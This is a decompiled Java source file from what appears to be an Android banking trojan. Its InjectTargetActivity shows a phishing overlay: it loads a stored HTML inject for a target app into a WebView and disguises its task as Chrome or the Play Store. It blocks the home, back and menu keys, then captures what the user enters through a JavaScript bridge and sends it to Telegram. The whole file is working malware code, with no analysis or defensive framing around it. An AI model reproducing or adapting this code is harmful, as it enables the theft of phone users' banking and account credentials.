/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.ActivityManager$TaskDescription
 *  android.content.Context
 *  android.content.Intent
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.graphics.Bitmap
 *  android.graphics.BitmapFactory
 *  android.graphics.drawable.Drawable
 *  android.os.Bundle
 *  android.view.KeyEvent
 *  android.view.View
 *  android.webkit.ConsoleMessage
 *  android.webkit.CookieManager
 *  android.webkit.JavascriptInterface
 *  android.webkit.JsResult
 *  android.webkit.WebChromeClient
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebSettings$PluginState
 *  android.webkit.WebSettings$RenderPriority
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.File;
import java.net.URI;
import linker.resourcer.encoder.AppDataManager;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.AccessibilityServiceController;

public class InjectTargetActivity
extends Activity {
    String current_id;
    private boolean flaged = false;
    WebView mWebView;
    AppDataManager manager;
    Context myctx;

    public void onBackPressed() {
        try {
            if (this.mWebView != null && this.mWebView.canGoBack()) {
                this.mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        }
        catch (NullPointerException nullPointerException) {
            super.onBackPressed();
        }
    }

    protected void onCreate(Bundle object) {
        CharSequence charSequence;
        Object object2;
        block19: {
            block20: {
                super.onCreate((Bundle)object);
                this.myctx = this.getApplicationContext();
                this.flaged = false;
                this.manager = new AppDataManager(this.getApplicationContext());
                object2 = this.getIntent();
                try {
                    charSequence = object2.getStringExtra("cuzid");
                    this.current_id = charSequence;
                }
                catch (Exception exception) {
                    this.finish();
                    return;
                }
                if (object2.hasExtra("icon")) {
                    object = object2.getStringExtra("label");
                    this.setTitle((CharSequence)object);
                    object2 = object2.getByteArrayExtra("icon");
                    Bitmap bitmap = BitmapFactory.decodeByteArray((byte[])object2, (int)0, (int)((Intent)object2).length);
                    object2 = new ActivityManager.TaskDescription((String)object, bitmap);
                    this.setTaskDescription((ActivityManager.TaskDescription)object2);
                    break block19;
                }
                object = "com.android.chrome";
                if (UtilityHelper.isPackageInstalled("com.android.chrome", this.getPackageManager())) break block20;
                object = "com.android.vending";
                if (UtilityHelper.isPackageInstalled("com.android.vending", this.getPackageManager())) break block20;
                object2 = UtilityHelper.getRandomLauncherApp(this.getApplicationContext());
                object = object2;
                if (UtilityHelper.isPackageInstalled((String)object2, this.getPackageManager())) break block20;
                object = null;
            }
            if (object == null) break block19;
            try {
                PackageManager packageManager = this.getPackageManager();
                object = packageManager.getApplicationInfo((String)object, 0);
                object2 = packageManager.getApplicationIcon((ApplicationInfo)object);
                object = ((Object)packageManager.getApplicationLabel((ApplicationInfo)object)).toString();
                this.setTitle((CharSequence)object);
                object2 = UtilityHelper.drawableToBitmap((Drawable)object2);
                packageManager = new ActivityManager.TaskDescription((String)object, (Bitmap)object2);
                this.setTaskDescription((ActivityManager.TaskDescription)packageManager);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        object = new WebView((Context)this);
        this.mWebView = object;
        this.mWebView.getSettings().setJavaScriptEnabled(true);
        object = this.mWebView;
        object2 = new WebAppInterface(this, (Context)this);
        object.addJavascriptInterface(object2, "Android");
        this.mWebView.getSettings().setLoadsImagesAutomatically(true);
        this.mWebView.getSettings().setLoadWithOverviewMode(true);
        try {
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(this.mWebView, true);
        }
        catch (Exception exception) {
            // empty catch block
        }
        this.mWebView.getSettings().setUseWideViewPort(true);
        this.mWebView.setScrollBarStyle(0);
        this.mWebView.getSettings().setAllowFileAccess(true);
        this.mWebView.getSettings().setCacheMode(1);
        this.mWebView.getSettings().setDomStorageEnabled(true);
        this.mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowContentAccess(true);
        try {
            this.mWebView.setLayerType(2, null);
            this.mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
            this.mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            this.mWebView.setBackgroundColor(-1);
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            this.mWebView.getSettings().setBuiltInZoomControls(false);
            object = this.mWebView.getSettings().getUserAgentString();
            this.mWebView.getSettings().setUserAgentString((String)object);
            object2 = this.mWebView;
            object = new MyChrome(this);
            object2.setWebChromeClient((WebChromeClient)object);
            object2 = this.mWebView;
            object = new MyWebViewClient(this);
            object2.setWebViewClient((WebViewClient)object);
            object2 = UtilityHelper.findjectfile(this.getApplicationContext(), (String)charSequence);
            object = new File(this.getFilesDir(), (String)object2);
            if (((File)object).exists()) {
                object2 = this.mWebView;
                charSequence = new StringBuilder();
                object2.loadUrl(((StringBuilder)charSequence).append("file://").append(((File)object).getAbsolutePath()).toString());
                this.setContentView((View)this.mWebView);
            } else {
                this.finish();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int n, KeyEvent keyEvent) {
        boolean bl = n == 3 || n == 4 || n == 82;
        return bl;
    }

    protected void onStop() {
        super.onStop();
    }

    public class MyChrome
    extends WebChromeClient {
        final InjectTargetActivity this$0;

        MyChrome(InjectTargetActivity ajuywtfqizlhmijsqlm2) {
            this.this$0 = ajuywtfqizlhmijsqlm2;
        }

        public boolean onConsoleMessage(ConsoleMessage object) {
            object = object.message();
            try {
                if (((String)object).startsWith("print event:")) {
                    AccessibilityServiceController.skipject = this.this$0.current_id;
                    this.this$0.manager.addData(this.this$0.current_id, (String)object);
                    this.this$0.finish();
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            return true;
        }
    }

    private class MyWebChromeClient
    extends WebChromeClient {
        final InjectTargetActivity this$0;

        private MyWebChromeClient(InjectTargetActivity ajuywtfqizlhmijsqlm2) {
            this.this$0 = ajuywtfqizlhmijsqlm2;
        }

        public boolean onJsAlert(WebView webView, String string2, String string3, JsResult jsResult) {
            return true;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final InjectTargetActivity this$0;

        private MyWebViewClient(InjectTargetActivity ajuywtfqizlhmijsqlm2) {
            this.this$0 = ajuywtfqizlhmijsqlm2;
        }

        public void onPageFinished(WebView webView, String string2) {
            super.onPageFinished(webView, string2);
        }

        public void onPageStarted(WebView webView, String string2, Bitmap bitmap) {
            super.onPageStarted(webView, string2, bitmap);
        }

        public void onReceivedError(WebView webView, int n, String string2, String string3) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest object) {
            CharSequence charSequence;
            if (object != null && object.getUrl() != null && !((String)(charSequence = object.getUrl().toString())).startsWith("http") && ((String)charSequence).contains("://")) {
                try {
                    object = new URI((String)charSequence);
                    charSequence = new StringBuilder();
                    webView.loadUrl(((StringBuilder)charSequence).append(((URI)object).getHost()).append(((URI)object).getPath()).toString());
                    return true;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
            return false;
        }
    }

    public class WebAppInterface {
        Context mContext;
        final InjectTargetActivity this$0;

        WebAppInterface(InjectTargetActivity ajuywtfqizlhmijsqlm2, Context context) {
            this.this$0 = ajuywtfqizlhmijsqlm2;
            this.mContext = context;
        }

        @JavascriptInterface
        public void returnResult(String string2) {
            AccessibilityServiceController.skipject = this.this$0.current_id;
            this.this$0.manager.addData(this.this$0.current_id, string2);
            CharSequence charSequence = UtilityHelper.getAppNameFromPkgName(this.this$0.myctx, this.this$0.current_id);
            String string3 = charSequence;
            try {
                if (((String)charSequence).isEmpty()) {
                    string3 = this.this$0.current_id;
                }
                Context context = this.this$0.myctx;
                charSequence = new StringBuilder();
                UtilityHelper.sendToTelegram(context, ((StringBuilder)charSequence).append("Inject | ").append(string3).toString(), string2);
                this.this$0.finish();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }
}

